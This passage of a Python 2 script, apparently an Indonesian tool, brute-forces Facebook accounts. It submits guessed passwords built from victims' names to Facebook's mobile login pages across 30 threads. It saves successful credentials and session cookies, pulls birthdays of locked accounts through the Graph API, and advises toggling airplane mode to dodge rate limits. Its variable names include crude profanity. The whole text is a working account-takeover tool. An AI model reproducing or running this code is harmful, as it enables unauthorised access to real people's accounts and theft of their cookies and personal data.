                            print '\033[0;96m╠═[%s+%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╚═[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat (5 detik) setiap 3 menit\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n%s[%s×%s] input yang bener'%(N,M,N);self.__yan__()
                    print '\n\033[0;96m╔═══[ \033[0;97mPilih Metode Untuk Login \033[0;96m]'
                    print '%s╠═[1]%s Metode api (cepat)'%(O,N)
                    print '%s╠═[2]%s Metode mbasic (lambat)'%(O,N)
                    print '%s╠═[3]%s Metode mobile (sangat lambat)'%(O,N)
                    print '%s║%s '%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n\033[0;96m╔═══[ \033[0;97mPilih Metode Untuk Login \033[0;96m]'
            print '%s╠═[1]%s Metode api (cepat)'%(O,N)
            print '%s╠═[2]%s Metode mbasic (lambat)'%(O,N)
            print '%s╠═[3]%s Metode mobile (sangat lambat)'%(O,N)
            print '%s║%s '%(O,N)
            self.__pler__()
        else:
            print '\n%s%s╚═[%s y/t goblok! ]'%(N,M,N);time.sleep(2);moch_yayan()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r%s╚═[%sCrack][%s/%s][OK:%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 GSA/12.44.23.23.arm64;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[Ok] %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                wrt = '╠[Ok] %s • %s • %s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[Cp] %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = '╠[Cp] %s • %s • %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                    
                print '\r%s[Cp] %s • %s                %s' % (K,user,pw,N)
                wrt = '╠[Cp] %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r%s╚═[%sCrack][%s/%s][OK:%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 GSA/12.44.23.23.arm64;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[Ok] %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                wrt = '╠[Ok] %s • %s • %s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[Cp] %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = '╠[Cp] %s • %s • %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r%s[Cp] %s • %s                %s' % (K,user,pw,N)
                wrt = '╠[Cp] %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r%s╚═[%sCrack][%s/%s][OK:%s][CP:%s] '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 GSA/12.44.23.23.arm64;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[Ok] %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                wrt = '╠[Ok] %s • %s • %s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[Cp] %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = '╠[Cp] %s • %s • %s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r%s[Cp] %s • %s                %s' % (K,user,pw,N)
                wrt = '╠[Cp] %s • %s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('\033[0;96m╚═[?] \033[0;97mMetode : ')
        if yan == '':
            print '\n%s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n\033[0;96m╔═[%s+%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╠═[%s+%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╚═[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat (5 detik) setiap 3 menit\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print '\n\033[0;96m╔═[%s+%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╠═[%s+%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╚═[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat (5 detik) setiap 3 menit\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print '\n\033[0;96m╔═[%s+%s\033[0;96m] \033[0;97makun OK saved in > results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╠═[%s+%s\033[0;96m] \033[0;97makun CP saved in > results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\033[0;96m╚═[%s!%s\033[0;96m] \033[0;97maktifkan mode pesawat (5 detik) setiap 3 menit\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print '\n%s[%s×%s] input yang bener'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
    
    
    
    
    
